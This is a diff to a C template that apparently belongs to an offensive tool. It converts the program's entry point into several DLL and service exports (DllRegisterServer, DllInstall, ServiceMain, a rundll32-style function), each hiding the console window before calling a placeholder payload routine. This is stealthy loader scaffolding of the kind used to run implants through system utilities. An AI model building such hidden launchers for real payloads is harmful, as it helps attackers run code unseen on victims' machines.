@@ -57,11 +57,47 @@
 
 #include "bolt.h"
 
-int main(int argc, char *argv[]) {
+EXPORT HRESULT WINAPI VoidFunc() {
     HANDLE c = GetConsoleWindow();
     if (c != NULL) {
         ShowWindow(c, 0);
     }
+    $secondary();
+}
+EXPORT HRESULT WINAPI DllRegisterServer() {
+    HANDLE c = GetConsoleWindow();
+    if (c != NULL) {
+        ShowWindow(c, 0);
+    }
+    $secondary();
+}
+EXPORT HRESULT WINAPI DllUnregisterServer() {
+    HANDLE c = GetConsoleWindow();
+    if (c != NULL) {
+        ShowWindow(c, 0);
+    }
+    $secondary();
+}
+EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {
+    HANDLE c = GetConsoleWindow();
+    if (c != NULL) {
+        ShowWindow(c, 0);
+    }
+    $secondary();
+}
+
+EXPORT VOID WINAPI ServiceMain(DWORD n, LPCWSTR* a) {
     $export();
-    return 0;
+}
+
+EXPORT void $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
+    HANDLE c = GetConsoleWindow();
+    if (c != NULL) {
+        ShowWindow(c, 0);
+    }
+    $secondary();
+}
+
+EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
+    return TRUE;
 }
